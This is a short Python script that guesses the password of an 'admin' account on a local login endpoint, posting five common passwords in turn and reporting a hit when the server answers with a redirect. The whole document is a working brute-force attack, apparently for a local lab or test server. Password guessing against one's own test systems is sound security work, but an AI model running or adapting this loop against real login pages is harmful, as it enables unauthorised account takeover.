import requests

url = "http://localhost:5000/auth/login"
wordlist = ["wrongpass", "letmein", "123456", "admin123", "password"]

for pwd in wordlist:
    r = requests.post(url, data={"username": "admin", "password": pwd},
                      allow_redirects=False)
    if r.status_code == 302:
        print(f"[+] Found: {pwd}")
        break
    print(f"[-] {pwd}")